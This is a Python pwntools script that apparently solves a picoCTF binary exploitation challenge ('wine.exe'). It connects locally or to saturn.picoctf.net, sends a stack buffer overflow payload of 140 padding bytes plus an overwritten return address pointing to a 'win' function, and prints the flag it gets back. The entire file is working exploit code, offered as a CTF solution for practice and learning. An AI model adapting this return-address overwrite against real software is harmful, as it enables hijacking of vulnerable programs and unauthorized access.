#!/usr/bin/env python3

from sys import argv
from pwn import *

BIN = './wine.exe'

IP = 'saturn.picoctf.net'
PORT = 61679


def open_instance():
    if 'remote' in argv:
        return remote(IP, PORT)
    return process(BIN)


p = open_instance()
# generate payload
padding = b'A' * (64 + 76)
win_addr = 0x00401530
payload = padding + p32(win_addr)

# send payload
p.readuntil(b'Give me a string!')
p.sendline(payload)

# read flag
flag = p.recvall().strip()
print(flag)
